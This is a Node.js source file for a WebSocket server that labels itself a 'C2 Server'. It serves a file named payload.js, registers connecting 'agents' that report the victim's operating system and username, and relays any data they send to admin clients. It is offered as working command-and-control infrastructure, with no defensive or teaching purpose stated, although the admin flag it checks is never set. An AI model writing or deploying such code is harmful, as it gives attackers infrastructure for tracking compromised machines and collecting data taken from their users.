const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Store active sessions
let clients = {}; 

app.use(express.static('.')); // Serve admin.html and payload.js

wss.on('connection', (ws) => {
    const id = uuidv4().substr(0, 8);
    clients[id] = { ws, info: {}, lastSeen: Date.now() };

    console.log(`[+] Client Connected: ${id}`);

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);
            
            // If it's an agent reporting in
            if (data.type === 'info') {
                clients[id].info = data;
                notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
            } 
            // If it's an agent sending data
            else {
                broadcastToAdmin(id, data);
            }
        } catch (e) {}
    });

    ws.on('close', () => {
        delete clients[id];
        notifyAdmin(id, '🔴 User Disconnected');
    });

    ws.send(JSON.stringify({ type: 'registered', id: id }));
});

function notifyAdmin(id, msg) {
    // In a real app, you'd push this specific update to the Admin page
    console.log(`[ADMIN ALERT] ${msg}`);
}

function broadcastToAdmin(id, data) {
    // Send data back to the admin dashboard for display
    // This would be handled by the admin HTML via WebSocket
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, ...data }));
        }
    });
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`C2 Server running on port ${PORT}`);
});